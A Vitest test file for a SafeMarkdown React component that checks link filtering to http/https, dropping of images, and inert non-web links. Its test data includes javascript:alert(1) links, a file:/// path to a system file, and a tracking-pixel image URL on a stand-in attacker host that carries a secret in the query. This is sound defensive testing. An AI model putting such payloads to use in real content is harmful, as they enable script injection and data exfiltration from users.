// @vitest-environment jsdom

import { openUrl } from '@tauri-apps/plugin-opener'
import { cleanup, fireEvent, render } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import SafeMarkdown, { webLinkTarget } from './safe-markdown'

vi.mock('@tauri-apps/plugin-opener', () => ({ openUrl: vi.fn(() => Promise.resolve()) }))

afterEach(() => {
	cleanup()
	vi.mocked(openUrl).mockClear()
})

describe('webLinkTarget', () => {
	it('accepts only http and https links', () => {
		expect(webLinkTarget('https://example.com/a?b=1')).toBe('https://example.com/a?b=1')
		expect(webLinkTarget('http://example.com')).toBe('http://example.com/')
		expect(webLinkTarget('javascript:alert(1)')).toBeNull()
		expect(webLinkTarget('file:///C:/Windows/win.ini')).toBeNull()
		expect(webLinkTarget('mailto:a@b.c')).toBeNull()
		expect(webLinkTarget(undefined)).toBeNull()
	})
})

describe('SafeMarkdown', () => {
	it('drops images instead of fetching them', () => {
		const { container } = render(<SafeMarkdown>{'![tracker](https://attacker.example/pixel.png?q=secret)\n\nhello'}</SafeMarkdown>)
		expect(container.querySelector('img')).toBeNull()
		expect(container.textContent).toContain('hello')
	})

	it('opens web links in the system browser instead of navigating the app', () => {
		const { getByRole } = render(<SafeMarkdown>{'[site](https://example.com/page)'}</SafeMarkdown>)
		const link = getByRole('link') as HTMLAnchorElement
		expect(link.getAttribute('href')).toBe('https://example.com/page')
		expect(fireEvent.click(link)).toBe(false)
		expect(openUrl).toHaveBeenCalledWith('https://example.com/page')
	})

	it('leaves a non-web link inert', () => {
		const { container } = render(<SafeMarkdown>{'[run](javascript:alert(1))'}</SafeMarkdown>)
		const link = container.querySelector('a')
		expect(link).not.toBeNull()
		expect(link?.getAttribute('href') ?? '').not.toContain('javascript:')
		fireEvent.click(link as HTMLAnchorElement)
		expect(openUrl).not.toHaveBeenCalled()
	})
})
